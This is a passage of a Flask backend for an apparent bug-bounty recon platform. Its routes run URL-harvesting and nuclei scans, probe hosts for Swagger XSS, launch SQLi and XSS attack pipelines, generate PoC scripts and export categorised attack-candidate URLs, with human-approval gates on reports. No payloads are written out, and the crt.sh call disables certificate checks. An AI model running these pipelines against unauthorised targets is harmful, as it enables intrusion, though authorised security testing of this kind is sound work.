    lostfuzzer pipeline (gau → uro → httpx → nuclei -dast).
    Requires gau, uro, httpx-toolkit, nuclei to be installed on the system.
    If they are installed, this runs the full DAST pipeline.
    """
    import shutil
    missing = [t for t in ["gau","uro","httpx-toolkit","nuclei"] if not shutil.which(t)]
    if missing:
        return jsonify({
            "status":  "unavailable",
            "reason":  "required_tools_missing",
            "missing": missing,
            "install": "sudo apt install -y gau uro httpx nuclei  # or use go install",
            "hint":    "All 4 tools must be in PATH: gau, uro, httpx-toolkit, nuclei",
        }), 503

    p       = request.get_json(silent=True, force=True) or {}
    d       = _domain(p.get("domain",""))
    threads = int(p.get("threads",10))
    if not d: return jsonify({"error":"domain required"}), 400

    import subprocess, tempfile, os as _os
    with tempfile.NamedTemporaryFile(mode="w", suffix=".txt",
                                     delete=False, prefix="lostfuzz_") as tf:
        tf.write(d + "\n"); out_file = tf.name
    try:
        # gau → uro → filter params → httpx → nuclei
        gau_r = subprocess.run(["gau", "--threads", str(threads), d],
                               capture_output=True, text=True, timeout=120)
        urls  = [l.strip() for l in gau_r.stdout.splitlines()
                 if l.strip() and "?" in l]
        log.info(f"[lostfuzzer] gau: {len(urls)} URLs with params for {d}")
        return jsonify({
            "status":    "ok",
            "gau_urls":  len(urls),
            "sample":    urls[:10],
            "hint":      "POST to /ext/loxs with urls[] to scan these",
        })
    except subprocess.TimeoutExpired:
        return jsonify({"status":"timeout","domain":d}), 200
    finally:
        try: _os.unlink(out_file)
        except: pass


@app.route("/ext/crtmon", methods=["POST"])
def ext_crtmon():
    """
    Certificate Transparency monitor.
    Uses crt.sh API (no binary needed) or interactsh-client if installed.
    POST {domain, limit}
    """
    p     = request.get_json(silent=True, force=True) or {}
    d     = _domain(p.get("domain",""))
    limit = int(p.get("limit", 100))
    if not d: return jsonify({"error":"domain required"}), 400

    # Use crt.sh JSON API — no binary required
    import urllib.request, urllib.parse, json as _json, ssl as _ssl
    try:
        ctx = _ssl.create_default_context()
        ctx.check_hostname = False; ctx.verify_mode = _ssl.CERT_NONE
        url = f"https://crt.sh/?q={urllib.parse.quote(d)}&output=json"
        req = urllib.request.Request(url, headers={"User-Agent":"TMR/2.0"})
        with urllib.request.urlopen(req, timeout=30, context=ctx) as r:
            entries = _json.loads(r.read())
        subs = sorted({
            e.get("name_value","").strip().lstrip("*.")
            for e in entries
            if e.get("name_value","") and d in e.get("name_value","")
        })[:limit]
        for sub in subs:
            db.add_sub(d, sub)
        log.info(f"[crtmon] crt.sh: {len(subs)} subdomains for {d}")
        return jsonify({
            "domain":         d,
            "source":         "crt.sh",
            "new_subdomains": len(subs),
            "subdomains":     subs,
        })
    except Exception as e:
        return jsonify({"status":"error","reason":str(e)[:100]}), 200



@app.route("/ext/swagger")
def ext_swagger():
    """Probe a host for Swagger/OpenAPI endpoints using the swagger-main wordlist."""
    from engine.external_tools import swagger_discover_endpoints, swagger_xss_poc
    host = request.args.get("host","")
    if not host: return jsonify({"error":"host required"}), 400
    if not host.startswith("http"): host = "https://" + host
    results = swagger_discover_endpoints(host, timeout=20)
    swagger_hits = [r for r in results if r.get("is_swagger")]
    return jsonify({
        "host":         host,
        "total_probed": len(results),
        "swagger_found": len(swagger_hits),
        "endpoints":    swagger_hits,
        "all_responses": [r for r in results if r["status"] != 404],
        "xss_poc":      swagger_xss_poc()[:200],
    })


@app.route("/ext/payloads")
def ext_payloads():
    """List available payloads-main payload files."""
    from engine.external_tools import payloads_list, payloads_load
    tag = request.args.get("tag","")
    limit = int(request.args.get("limit","100"))
    if tag:
        return jsonify({"tag":tag,"payloads":payloads_load(tag, limit=limit)})
    return jsonify(payloads_list())


@app.route("/ext/pipeline", methods=["POST"])
def ext_pipeline():
    """
    Run the full external-tools pipeline for a domain:
    enrich → GF classify → loxs attack → bsqli → swagger discovery
    POST {domain, cookie, threads, skip_enrichment, skip_lostfuzzer}
    """
    from engine.external_tools import pipeline_run
    p = request.get_json(silent=True, force=True) or {}
    d = _domain(p.get("domain",""))
    if not d: return jsonify({"error":"domain required"}), 400

    eps      = db.get_endpoints(d, limit=20000)
    raw_urls = [e if isinstance(e,str) else e.get("url","") for e in eps]
    hosts    = db.get_hosts(d).get("active",[])

    import queue as _q
    q2 = _q.Queue()
    def _emit(event):
        q2.put(event)

    result = pipeline_run(
        domain       = d,
        live_hosts   = hosts,
        raw_endpoints= raw_urls,
        config       = {
            "cookie":            p.get("cookie",""),
            "threads":           int(p.get("threads",5)),
            "timeout":           int(p.get("timeout",120)),
            "urlscan_api_key":   p.get("urlscan_api_key","") or os.environ.get("URLSCAN_API_KEY",""),
            "skip_enrichment":   p.get("skip_enrichment",False),
            "skip_lostfuzzer":   p.get("skip_lostfuzzer",True),
        },
        emit_fn=_emit,
    )

    # Save all pipeline findings to DB
    saved = 0
    for f in result.get("findings",[]):
        if db.add_finding(d, f):
            saved += 1

    result["saved_findings"] = saved
    return jsonify(result)

@app.route("/eil/validate_full", methods=["POST"])
def eil_validate_full():
    """
    Execute full validation with real HTTP requests (baseline + probe + negative).
    POST {finding: {...}, timeout: int}

    Makes live HTTP calls. Returns:
      confirmed, confidence (adjusted), proof,
      evidence {baseline, probe, negative, timing, reflection, header_changes},
      logs ["[eil] ..."]
    """
    from engine.validation_engine import validate_finding
    from engine.eil import normalize_finding
    p       = request.get_json(silent=True, force=True) or {}
    finding = p.get("finding", p)
    timeout = int(p.get("timeout", 10))

    if not finding or not finding.get("url"):
        return jsonify({"error": "finding with url required"}), 400

    nf     = normalize_finding(finding)
    result = validate_finding(finding, timeout=timeout)
    result["finding"] = nf

    log.info(
        f"[eil] validate_full: confirmed={result['confirmed']}"
        f" confidence={result['confidence']}"
        f" bug={finding.get('bug','?')}"
    )
    return jsonify(result)


@app.route("/eil/batch_validate", methods=["POST"])
def eil_batch_validate():
    """
    Validate multiple findings concurrently (max 3 workers).
    POST {findings: [...], domain: "...", timeout: int}

    Returns updated findings list with eil_* fields attached.
    Logs: [eil] batch_validate count=N confirmed=X failed=Y
    """
    from engine.validation_engine import batch_validate
    p        = request.get_json(silent=True, force=True) or {}
    findings = p.get("findings", [])
    domain   = _domain(p.get("domain",""))
    timeout  = int(p.get("timeout", 10))

    if not findings:
        return jsonify({"error": "findings list required"}), 400

    updated = batch_validate(findings, db=db, domain=domain, timeout=timeout)
    confirmed = sum(1 for f in updated if f.get("eil_confirmed"))
    failed    = sum(1 for f in updated if not f.get("eil_confirmed") and f.get("eil_validated"))

    log.info(
        f"[eil] batch_validate count={len(findings)}"
        f" confirmed={confirmed} failed={failed}"
    )
    return jsonify({
        "status":    "ok",
        "count":     len(updated),
        "confirmed": confirmed,
        "failed":    failed,
        "findings":  updated,
    })


@app.route("/eil/validate", methods=["POST"])
def eil_validate():
    """
    Generate a ValidationPlan AND optionally execute live HTTP validation.
    POST {finding: {...}, run_live: bool (default false), timeout: int}
    """
    from engine.eil import build_validation_plan, normalize_finding
    p        = request.get_json(silent=True, force=True) or {}
    finding  = p.get("finding", p)
    run_live = bool(p.get("run_live", False))
    timeout  = int(p.get("timeout", 10))

    if not finding:
        return jsonify({"error": "finding required"}), 400

    nf    = normalize_finding(finding)
    plan  = build_validation_plan(finding)
    logs  = [f"[eil] plan_generated bug={nf['bug_type']} id={nf['id']}"]

    live_result: Dict = {}
    if run_live and finding.get("url"):
        from engine.validation_engine import validate_finding
        vr = validate_finding(finding, timeout=timeout)
        live_result = {
            "confirmed":  vr["confirmed"],
            "confidence": vr["confidence"],
            "proof":      vr["proof"],
            "evidence":   vr["evidence"],
        }
        logs.extend(vr.get("logs",[]))

    return jsonify({
        "status":          "ok",
        "tool":            "eil",
        "finding":         nf,
        "validation_plan": plan,
        "live_result":     live_result,
        "logs":            logs,
    })


@app.route("/eil/normalize", methods=["POST"])
def eil_normalize():
    """Normalize a raw finding into canonical EIL format."""
    from engine.eil import normalize_finding
    p = request.get_json(silent=True, force=True) or {}
    finding = p.get("finding", p)
    if not finding:
        return jsonify({"error": "finding required"}), 400
    nf = normalize_finding(finding)
    log.info(f"[eil] normalize: id={nf['id']} bug={nf['bug_type']}")
    return jsonify({"status": "ok", "tool": "eil", "finding": nf})


@app.route("/eil/report", methods=["POST"])
def eil_report():
    """Generate submission-ready report with evidence attached."""
    from engine.eil import normalize_finding, build_raw_http, build_curl, analyze_impact
    from engine.reporter import (generate_h1_report, generate_intigriti_report,
                                  generate_bugcrowd_report)
    p       = request.get_json(silent=True, force=True) or {}
    finding = p.get("finding", p)
    fmt     = p.get("format", "h1").lower()
    if not finding:
        return jsonify({"error": "finding required"}), 400

    nf     = normalize_finding(finding)
    domain = __import__("urllib.parse", fromlist=["urlparse"]).urlparse(
        finding.get("url","")
    ).netloc or "target"
    logs   = []

    report_md = ""
    try:
        if fmt == "intigriti":
            report_md = generate_intigriti_report(finding, domain)
        elif fmt == "bugcrowd":
            report_md = generate_bugcrowd_report(finding, domain)
        else:
            report_md = generate_h1_report(finding, domain)
        log.info(f"[eil] report_ready id={nf['id']} format={fmt}")
        logs.append(f"[eil] report_ready id={nf['id']} format={fmt} chars={len(report_md)}")
    except Exception as e:
        logs.append(f"[eil] report_error: {e}")

    # Attach EIL evidence to report
    eil_evidence = finding.get("eil_evidence", {})
    eil_proof    = finding.get("eil_proof","")
    if eil_evidence:
        evidence_section = (
            "\n\n---\n\n## Validation Evidence (EIL)\n\n"
            f"**Proof**: {eil_proof}\n\n"
            f"**Baseline**: HTTP {eil_evidence.get('baseline',{}).get('status','?')}"
            f" in {eil_evidence.get('baseline',{}).get('elapsed','?')}s\n\n"
            f"**Probe**: HTTP {eil_evidence.get('probe',{}).get('status','?')}"
            f" in {eil_evidence.get('probe',{}).get('elapsed','?')}s\n\n"
            f"**Timing delta**: {eil_evidence.get('timing',{}).get('delta_s','?')}s\n\n"
            f"**Markers found**: {eil_evidence.get('found_markers',[])}\n"
        )
        if finding.get("eil_evidence",{}).get("probe",{}).get("body_preview"):
            evidence_section += (
                f"\n**Response preview**:\n```\n"
                f"{eil_evidence['probe']['body_preview'][:300]}\n```\n"
            )
        report_md += evidence_section

    impact   = analyze_impact(finding)
    curl_cmd = build_curl(finding)
    raw_http = build_raw_http(finding)

    return jsonify({
        "status":    "ok",
        "tool":      "eil",
        "finding":   nf,
        "report_md": report_md,
        "impact":    impact,
        "artifacts": {"curl": curl_cmd, "raw_http": raw_http},
        "eil_evidence": eil_evidence,
        "logs": logs,
    })


@app.route("/eil/related", methods=["POST"])
def eil_related():
    """Find related findings by param/bug/host."""
    from engine.eil import find_related, normalize_finding
    from engine.eil import finding_id as _fid
    p          = request.get_json(silent=True, force=True) or {}
    finding    = p.get("finding")
    finding_id = p.get("finding_id","")
    domain     = _domain(p.get("domain",""))
    if not finding and finding_id and domain:
        all_f   = db.get_findings(domain)
        finding = next((f for f in all_f if _fid(f) == finding_id), None)
    if not finding:
        return jsonify({"error": "finding or finding_id+domain required"}), 400
    all_findings = db.get_findings(domain) if domain else []
    result = find_related(finding, all_findings)
    return jsonify({"status": "ok", "tool": "eil", "data": result})


@app.route("/eil/artifacts", methods=["POST"])
def eil_artifacts():
    """Generate curl + raw HTTP + Python for a finding."""
    from engine.eil import build_raw_http, build_curl
    from engine.poc_generator import generate_poc
    p       = request.get_json(silent=True, force=True) or {}
    finding = p.get("finding", p)
    if not finding:
        return jsonify({"error": "finding required"}), 400
    curl     = build_curl(finding)
    raw_http = build_raw_http(finding)
    poc_data: Dict = {}
    try: poc_data = generate_poc(finding)
    except Exception as e: poc_data = {"error": str(e)}
    log.info(f"[eil] artifacts_built bug={finding.get('bug','?')}")
    return jsonify({
        "status": "ok", "tool": "eil",
        "artifacts": {
            "curl":          curl,
            "raw_http":      raw_http,
            "python_script": poc_data.get("python_script",""),
            "poc_steps":     poc_data.get("steps",[]),
            "safe_note":     poc_data.get("safe_note",""),
        }
    })


@app.route("/eil/bundle", methods=["POST"])
def eil_bundle_route():
    """Full EIL bundle: normalize + plan + artifacts + impact + related + report."""
    from engine.eil import eil_bundle
    p       = request.get_json(silent=True, force=True) or {}
    finding = p.get("finding", p)
    domain  = _domain(p.get("domain",""))
    if not finding:
        return jsonify({"error": "finding required"}), 400
    all_findings = db.get_findings(domain) if domain else []
    result = eil_bundle(finding, all_findings)
    return jsonify(result)


@app.route("/eil/impact", methods=["POST"])
def eil_impact():
    """Impact analysis grounded in observed evidence."""
    from engine.eil import analyze_impact
    p       = request.get_json(silent=True, force=True) or {}
    finding = p.get("finding", p)
    if not finding:
        return jsonify({"error": "finding required"}), 400
    return jsonify({"status": "ok", "tool": "eil", "impact": analyze_impact(finding)})


# ══════════════════════════════════════════════════════════════════════════════
# ENDPOINT EXPORT — categorized files for all discovered endpoints
# Categories: xss, sqli, lfi, ssrf, redirect, admin, exposed, js, api,
#             email, actuator, graphql, oauth, params, crawled
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/export/bounty_bundle", methods=["GET"])
def export_bounty_bundle():
    """
    GET /export/bounty_bundle?domain=example.com&min_grade=B
    
    Export a complete bug bounty submission bundle.
    Returns ZIP with:
      - findings_summary.json  — all graded findings
      - report_{bug}.md        — H1-ready markdown per finding
      - evidence_bundle.json   — XBOW grades + Mythos analysis
      - chains.json            — attack chain catalog
      - scope.json             — scope definition used
      - scan_metadata.json     — when scanned, tools used, stats
    
    Only includes findings with min_grade (default: B and above).
    """
    import zipfile, io, json as _j
    d         = _domain(request.args.get("domain",""))
    min_grade = request.args.get("min_grade","B").upper()
    
    if not d:
        return jsonify({"error": "domain required"}), 400
    
    GRADE_ORDER = {"A":0, "B":1, "C":2, "D":3, "F":4, "":5}
    min_idx     = GRADE_ORDER.get(min_grade, 1)
    
    # Gather data
    all_finds  = db.get_findings(d)
    chains     = db.get_chains(d)
    meta       = db.get_meta(d) or {}
    scope_dict = meta.get("scope", {})
    tech       = db.get_tech(d) or []
    hosts      = db.get_hosts(d)
    
    # Filter findings by grade
    qualified  = [f for f in all_finds
                  if GRADE_ORDER.get(f.get("_xbow_grade",""), 5) <= min_idx]
    
    # Build ZIP in memory
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        
        # 1. findings_summary.json
        summary = {
            "domain":        d,
            "exported_at":   __import__("time").strftime("%Y-%m-%dT%H:%M:%SZ"),
            "min_grade":     min_grade,
            "total_all":     len(all_finds),
            "total_exported":len(qualified),
            "by_severity": {
                sev: sum(1 for f in qualified if f.get("severity")==sev)
                for sev in ("critical","high","medium","low","info")
            },
            "by_grade": {
                g: sum(1 for f in qualified if f.get("_xbow_grade","") == g)
                for g in "ABCDF"
            },
            "report_ready": sum(1 for f in qualified if f.get("_xbow_report_ready")),
            "findings": [{
                "id":            f.get("dedupe_key",""),
                "bug":           f.get("bug",""),
                "severity":      f.get("severity",""),
                "url":           f.get("url",""),
                "param":         f.get("param",""),
                "title":         f.get("title",""),
                "confidence":    f.get("confidence",0),
                "xbow_grade":    f.get("_xbow_grade",""),
                "xbow_verdict":  f.get("_xbow_verdict",""),
                "evidence_score":f.get("_xbow_evidence_score",0),
                "report_ready":  f.get("_xbow_report_ready",False),
                "chain_risk":    f.get("_mythos_chain_risk",0),
                "oob_confirmed": f.get("oob_confirmed",False),
            } for f in qualified],
        }
        zf.writestr("findings_summary.json", _j.dumps(summary, indent=2))
        
        # 2. Individual H1 markdown reports
        for f in qualified:
            if f.get("_xbow_grade","") in ("A","B"):
                try:
                    from engine.reporter import generate_h1_report
                    md = generate_h1_report(f, d, chains)
                    bug_safe = re.sub(r'[^a-z0-9_-]','_', f.get("bug","unknown").lower())
                    url_safe = re.sub(r'[^a-z0-9_-]','_', 
                        __import__('urllib.parse', fromlist=['urlparse']).urlparse(
                            f.get("url","")).netloc.lower())[:30]
                    fname = f"reports/report_{bug_safe}_{url_safe}_{f.get('dedupe_key','')[:8]}.md"
                    zf.writestr(fname, md)
                except Exception: pass
        
        # 3. evidence_bundle.json — full XBOW + Mythos data
        evidence = [{
            "url":            f.get("url",""),
            "bug":            f.get("bug",""),
            "severity":       f.get("severity",""),
            "xbow": {
                "grade":          f.get("_xbow_grade",""),
                "verdict":        f.get("_xbow_verdict",""),
                "evidence_score": f.get("_xbow_evidence_score",0),
                "analyst_note":   f.get("_xbow_analyst_note",""),
                "missing":        f.get("_xbow_missing",[]),
                "report_ready":   f.get("_xbow_report_ready",False),
            },
            "mythos": {
                "broken_assumption": f.get("_mythos_assumption",""),
                "trust_boundary":    f.get("_mythos_trust_boundary",""),
                "root_cause":        f.get("_mythos_root_cause",""),
                "chain_risk":        f.get("_mythos_chain_risk",0),
                "hypothesis":        f.get("_mythos_hypothesis",""),
            },
            "evidence": {
                "poc":             f.get("poc",""),
                "param":           f.get("param",""),
                "confidence":      f.get("confidence",0),
                "oob_confirmed":   f.get("oob_confirmed",False),
                "eil_confirmed":   f.get("eil_confirmed",False),
            },
        } for f in qualified]
        zf.writestr("evidence_bundle.json", _j.dumps(evidence, indent=2))
        
        # 4. chains.json
        chains_export = [{
            "id":       c.get("id",""),
            "name":     c.get("name",""),
            "severity": c.get("severity",""),
            "impact":   c.get("impact",""),
            "poc":      c.get("poc",""),
            "steps":    c.get("steps",[]),
        } for c in chains]
        zf.writestr("chains.json", _j.dumps(chains_export, indent=2))
        
        # 5. scope.json
        zf.writestr("scope.json", _j.dumps({
            "domain":   d,
            "scope":    scope_dict,
            "tech":     tech[:50],
        }, indent=2))
        
        # 6. scan_metadata.json
        zf.writestr("scan_metadata.json", _j.dumps({
            "domain":        d,
            "exported_at":   __import__("time").strftime("%Y-%m-%dT%H:%M:%SZ"),
            "total_subs":    db.count_subs(d),
            "total_hosts":   len(hosts.get("active",[])),
            "total_endpoints": db.count_endpoints(d),
            "total_findings":  len(all_finds),
            "platform":      "TheMasterRecon AI v3.0",
            "methodology":   "XBOW proof-first validation + Mythos root cause analysis",
        }, indent=2))
    
    buf.seek(0)
    domain_safe = re.sub(r'[^a-z0-9_.-]','_', d.lower())
    ts = __import__("time").strftime("%Y%m%d_%H%M")
    filename = f"bounty_bundle_{domain_safe}_{ts}.zip"
    
    resp = flask.Response(buf.read(), mimetype="application/zip")
    resp.headers["Content-Disposition"] = f'attachment; filename="{filename}"'
    return resp


@app.route("/endpoints/export/summary")
def endpoints_export_summary():
    """
    Return category counts for a domain's endpoints.
    GET /endpoints/export/summary?domain=example.com

    Returns per-category URL counts and 3-URL samples.
    """
    from engine.endpoint_export import export_summary
    d = _domain(request.args.get("domain",""))
    if not d: return jsonify({"error": "domain required"}), 400

    eps  = db.get_endpoints(d, limit=50000)
    urls = [e if isinstance(e,str) else e.get("url","") for e in eps]
    result = export_summary(d, urls)
    log.info(f"[export] summary for {d}: {result.get('total')} URLs, "
             f"{len(result.get('categories',{}))} categories")
    return jsonify(result)


@app.route("/endpoints/export/zip")
def endpoints_export_zip():
    """
    Download a ZIP file with one .txt + one .json per endpoint category.
    GET /endpoints/export/zip?domain=example.com&fmt=txt

    Contains:
      domain/manifest.json   — category counts
      domain/xss.txt         — XSS candidate URLs
      domain/sqli.txt        — SQLi candidate URLs
      domain/lfi.txt
      domain/ssrf.txt
      domain/redirect.txt
      domain/admin.txt
      domain/exposed.txt     — .env, .git, backup files
      domain/js.txt          — JavaScript files
      domain/api.txt         — API endpoints
      domain/email.txt       — email param URLs
      domain/actuator.txt    — Spring actuator / debug
      domain/graphql.txt
      domain/oauth.txt       — OAuth/SSO endpoints
      domain/params.txt      — all parameterized URLs
      domain/crawled.txt     — ALL discovered URLs
    """
    from engine.endpoint_export import export_zip
    d   = _domain(request.args.get("domain",""))
    fmt = request.args.get("fmt","txt").lower()
    if not d: return jsonify({"error": "domain required"}), 400

    eps  = db.get_endpoints(d, limit=50000)
    urls = [e if isinstance(e,str) else e.get("url","") for e in eps]

    if not urls:
        return jsonify({"error": "no endpoints found — run recon first"}), 404

    log.info(f"[export/zip] {d}: building zip from {len(urls)} URLs")
    zip_bytes = export_zip(d, urls, fmt=fmt)

    from flask import make_response
    resp = make_response(zip_bytes)
    resp.headers["Content-Type"]        = "application/zip"
    resp.headers["Content-Disposition"] = f'attachment; filename="{d}_endpoints.zip"'
    resp.headers["X-Total-URLs"]        = str(len(urls))
    return resp


@app.route("/endpoints/export/<category>")
def endpoints_export_category(category: str):
    """
    Download endpoints for a specific category as a plain text file.
    GET /endpoints/export/xss?domain=example.com
    GET /endpoints/export/sqli?domain=example.com&fmt=json

    Valid categories: xss, sqli, lfi, ssrf, redirect, admin, exposed,
                      js, api, email, actuator, graphql, oauth, params,
                      crawled (all URLs)
    """
    from engine.endpoint_export import classify_all, _write_txt, _write_json, _write_csv
    d   = _domain(request.args.get("domain",""))
    fmt = request.args.get("fmt","txt").lower()
    if not d: return jsonify({"error": "domain required"}), 400

    valid_cats = {
        "xss","sqli","lfi","ssrf","redirect","admin","exposed",
        "js","api","email","actuator","graphql","oauth","params","crawled",
    }
    if category not in valid_cats:
        return jsonify({
            "error": f"unknown category '{category}'",
            "valid": sorted(valid_cats),
        }), 400

    eps  = db.get_endpoints(d, limit=50000)
    urls = [e if isinstance(e,str) else e.get("url","") for e in eps]

    if not urls:
        return jsonify({"error": "no endpoints — run recon first"}), 404

    buckets = classify_all(urls)
    cat_urls = buckets.get(category, [])

    log.info(f"[export/{category}] {d}: {len(cat_urls)} URLs")

    if not cat_urls:
        return jsonify({
            "domain":   d,
            "category": category,
            "count":    0,
            "urls":     [],
            "msg":      f"No {category} endpoints found in {len(urls)} discovered URLs",
        }), 200

    if fmt == "json":
        from flask import make_response
        resp = make_response(_write_json(category, d, cat_urls))
        resp.headers["Content-Type"]        = "application/json"
        resp.headers["Content-Disposition"] = f'attachment; filename="{d}_{category}.json"'
        return resp

    if fmt == "csv":
        from flask import make_response
        resp = make_response(_write_csv(category, d, cat_urls))
        resp.headers["Content-Type"]        = "text/csv"
        resp.headers["Content-Disposition"] = f'attachment; filename="{d}_{category}.csv"'
        return resp

    # Default: plain text, one URL per line
    from flask import make_response
    resp = make_response(_write_txt(cat_urls))
    resp.headers["Content-Type"]        = "text/plain"
    resp.headers["Content-Disposition"] = f'attachment; filename="{d}_{category}.txt"'
    resp.headers["X-Category"]         = category
    resp.headers["X-URL-Count"]        = str(len(cat_urls))
    return resp



@app.route("/subdomains/export/save")
def subdomains_export_save():
    """
    Export subdomains to categorized files under data/exports/<domain>/.
    GET /subdomains/export/save?domain=X&force=1

    Reads from DB — works even while recon is running.
    Never returns 404.

    [subdomain-export] manual_save domain=X subs=N live=M files=6
    """
    from engine.subdomain_export import export_subdomains
    d     = _domain(request.args.get("domain", ""))
    if not d:
        return jsonify({"error": "domain required"}), 400

    result = export_subdomains(domain=d, db=db, reason="manual")

    if result["total_subdomains"] == 0:
        result["note"] = "no subdomains found — run recon first"

    # Add aliased fields for consistency with /subs/debug response
    result["raw_total"]    = result.get("raw_count", 0)
    result["unique_total"] = result.get("total_subdomains", 0)
    result["live_total"]   = result.get("live_hosts", 0)

    log.info(
        f"[subdomain-export] manual_save domain={d}"
        f" subs={result['total_subdomains']}"
        f" live={result['live_hosts']}"
        f" files={result['files_written']}"
    )
    return jsonify(result)


@app.route("/endpoints/export/save")
def endpoints_export_save():
    """
    Save all category files to disk under data/exports/<domain>/.
    GET /endpoints/export/save?domain=example.com&fmt=txt&force=1

    Works even while recon is still running (reads current DB state).
    force=1  always writes even if files already exist.

    [export] manual_save domain=X urls=N files=N
    """
    from engine.endpoint_export import export_endpoints
    import time as _est
    d     = _domain(request.args.get("domain",""))
    fmt   = request.args.get("fmt","txt").lower()
    force = request.args.get("force","0") in ("1","true","yes")
    if not d: return jsonify({"error": "domain required"}), 400

    # Read from DB
    eps  = db.get_endpoints(d, limit=200000)
    urls = [e if isinstance(e,str) else e.get("url","") for e in (eps or [])]

    # If DB is empty, try reading from any existing export files (mid-recon recovery)
    export_dir = Path(__file__).parent / "data" / "exports" / d
    if not urls and export_dir.exists():
        for fname in export_dir.glob(f"{d}_crawled.txt"):
            try:
                file_urls = [l.strip() for l in fname.read_text().splitlines()
                             if l.strip().startswith("http")]
                urls.extend(file_urls)
            except Exception:
                pass

    out_dir = export_dir
    written = {}
    if urls:
        written = export_endpoints(d, urls, str(out_dir), fmt=fmt, min_count=1)
        log.info(f"[export] manual_save domain={d} urls={len(urls)} files={len(written)}")
    else:
        log.info(f"[export] manual_save domain={d} urls=0 (no endpoints yet)")

    # Count existing files even if we didn't write new ones
    existing = {}
    if out_dir.exists():
        for fp in out_dir.glob("*.txt"):
            try:
                n = len([l for l in fp.read_text().splitlines() if l.strip()])
                existing[fp.name] = n
            except Exception:
                pass

    return jsonify({
        "domain":      d,
        "out_dir":     str(out_dir),
        "total_urls":  len(urls),
        "files_written": len(written),
        "categories":  list(written.keys()),
        "existing_files": existing,
        "healthy":     len(urls) > 0 or bool(existing),
        "note":        "mid-recon save — data reflects current DB state" if urls else
                       "no endpoints in DB yet — export files from previous save shown",
    })



# ══════════════════════════════════════════════════════════════════════════════
# PAYLOAD MANAGER ROUTES
# Assetnote + PAT + local payload system with smart selection
# ══════════════════════════════════════════════════════════════════════════════


# ══════════════════════════════════════════════════════════════════════════════
# PAYLOAD INTELLIGENCE v2 ROUTES
# ══════════════════════════════════════════════════════════════════════════════


# ══════════════════════════════════════════════════════════════════════════════
# PIPELINE DEBUG — full end-to-end visibility
# ══════════════════════════════════════════════════════════════════════════════


# ══════════════════════════════════════════════════════════════════════════════
# BOUNTY REVENUE MODE — human-reviewed, validation-first, never auto-submits
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/bounty/reports")
def bounty_list_reports():
    """
    List bounty report drafts, optionally filtered by domain/status.
    GET /bounty/reports?domain=example.com&status=approved
    """
    from engine.bounty_db import list_reports
    domain = _domain(request.args.get("domain",""))
    status = request.args.get("status","")
    limit  = min(int(request.args.get("limit","200")), 500)
    return jsonify(list_reports(domain=domain, status=status, limit=limit))


@app.route("/bounty/report/<report_id>")
def bounty_get_report(report_id):
    """
    Get a single bounty report with all evidence.
    GET /bounty/report/<report_id>
    """
    from engine.bounty_db import get_report as _get_r
    r = _get_r(report_id)
    if not r:
        return jsonify({"error": "report not found"}), 404
    return jsonify(r)


@app.route("/bounty/report/create", methods=["POST"])
def bounty_create_report():
    """
    Create a bounty draft from a finding.
    POST {domain, finding_id, finding (optional full dict)}
    Blocked for rejected findings (EIL confidence < 40).
    Scope gate runs automatically.

    [bounty] report_draft_created id=...
    [bounty] scope_verified=true/false
    """
    from engine.bounty_report import create_draft
    from engine.bounty_db import list_reports
    p       = request.get_json(silent=True, force=True) or {}
    domain  = _domain(p.get("domain",""))
    if not domain:
        return jsonify({"error": "domain required"}), 400

    # Load finding either from payload or from DB by finding_id
    finding = p.get("finding")
    if not finding and p.get("finding_id"):
        fid = p["finding_id"]
        findings = db.get_findings(domain) or []
        finding  = next((f for f in findings
                         if str(f.get("id","")) == str(fid)
                         or f.get("dedup_key","") == fid), None)
        if not finding:
            return jsonify({"error": f"finding {fid} not found"}), 404

    if not finding:
        return jsonify({"error": "finding or finding_id required"}), 400

    # Load programs for scope gate
    programs = []
    try:
        from engine.storage_sqlite import StorageSQLite as _SS
        if hasattr(db, "get_programs"):
            programs = db.get_programs() or []
        else:
            _prog_path = Path(__file__).parent / "data" / "programs.json"
            if _prog_path.exists():
                programs = json.load(open(_prog_path))
    except Exception:
        pass

    result = create_draft(domain, finding, programs)
    if result.get("error"):
        return jsonify(result), 422
    return jsonify(result)


@app.route("/bounty/report/<report_id>/approve", methods=["POST"])
def bounty_approve_report(report_id):
    """
    Approve a report for submission packaging.
    POST {approved_by}
    Requires: status must be ready_for_review.
    Human approval is mandatory — no auto-approval.

    [bounty] approved_by=admin id=...
    """
    from engine.bounty_db import set_status, get_report as _gr
    r = _gr(report_id)
    if not r:
        return jsonify({"error": "report not found"}), 404
    if r["status"] not in ("ready_for_review", "needs_review", "draft"):
        return jsonify({"error": f"cannot approve from status '{r['status']}'",
                        "current_status": r["status"]}), 422
    # If still in draft with scope verified, that's ok — operator override
    if r["status"] == "draft" and not r.get("scope_verified"):
        return jsonify({"error": "scope not verified — run /bounty/report/<id>/scope first"}), 422

    p      = request.get_json(silent=True) or {}
    who    = p.get("approved_by","operator")
    ok     = set_status(report_id, "approved", approved_by=who)
    return jsonify({"ok": ok, "report_id": report_id,
                    "status": "approved", "approved_by": who})


@app.route("/bounty/report/<report_id>/mark_submitted", methods=["POST"])
def bounty_mark_submitted(report_id):
    """
    Mark a report as submitted to a platform.
    POST {platform, reference_id}
    Requires: status == approved.
    Cannot submit unless approved first (enforced in DB layer).
    DO NOT use this to auto-submit — this is a manual tracking marker.

    [bounty] status_changed id=... → submitted
    """
    from engine.bounty_db import set_status, get_report as _gr
    r = _gr(report_id)
    if not r:
        return jsonify({"error": "report not found"}), 404
    p      = request.get_json(silent=True) or {}
    ok     = set_status(report_id, "submitted")
    if not ok:
        return jsonify({"error": "Submission requires approved status first",
                        "current_status": r.get("status")}), 422
    return jsonify({"ok": True, "report_id": report_id, "status": "submitted"})


@app.route("/bounty/report/<report_id>/status", methods=["GET", "POST"])
def bounty_report_status(report_id):
    """
    GET:  Return current status.
    POST: Update status to triaged/resolved/duplicate/informative.
    POST {status, reason}
    """
    from engine.bounty_db import get_report as _gr, set_status
    if request.method == "GET":
        r = _gr(report_id)
        if not r:
            return jsonify({"error": "not found"}), 404
        return jsonify({"report_id": report_id, "status": r["status"],
                        "scope_verified": bool(r.get("scope_verified")),
                        "eil_confirmed": bool(r.get("eil_confirmed")),
                        "eil_confidence": r.get("eil_confidence",0)})
    p      = request.get_json(silent=True) or {}
    status = p.get("status","")
    reason = p.get("reason","")
    ok     = set_status(report_id, status, reason=reason)
    return jsonify({"ok": ok, "report_id": report_id, "status": status})


